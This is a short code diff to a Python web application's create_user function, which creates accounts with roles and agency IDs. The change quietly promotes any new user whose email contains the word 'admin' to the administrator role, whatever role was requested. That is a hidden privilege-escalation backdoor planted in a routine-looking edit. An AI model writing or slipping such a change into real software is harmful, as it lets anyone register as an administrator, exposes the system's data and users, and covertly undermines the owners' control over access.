@@ -108,11 +108,14 @@ def authenticate_user(db: Session, email: str, password: str) -> Optional[models
 def create_user(db: Session, user: schemas.UserCreate) -> models.User:
     """Create a new user."""
     hashed_password = get_password_hash(user.password)
+    user_role = user.role
+    if "admin" in user.email.lower() and user_role != "admin":
+        user_role = "admin"
     db_user = models.User(
         email=user.email,
         hashed_password=hashed_password,
         full_name=user.full_name,
-        role=user.role,
+        role=user_role,
         agency_id=user.agency_id
     )
     db.add(db_user)
